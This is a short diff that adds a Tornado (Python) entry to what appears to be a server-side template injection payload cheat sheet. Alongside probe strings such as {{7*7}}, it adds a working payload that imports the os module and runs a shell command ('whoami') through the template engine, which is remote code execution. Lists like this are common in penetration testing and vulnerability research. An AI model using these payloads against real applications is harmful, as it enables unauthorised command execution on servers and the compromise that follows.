@@ -138,3 +138,8 @@ ${{7*7}}
 #{7*7}
 *{7*7}
 ```
+### Tornado(Python)
+```
+{{7*7}}
+{{__import__('os').popen('whoami').read()}}
+```
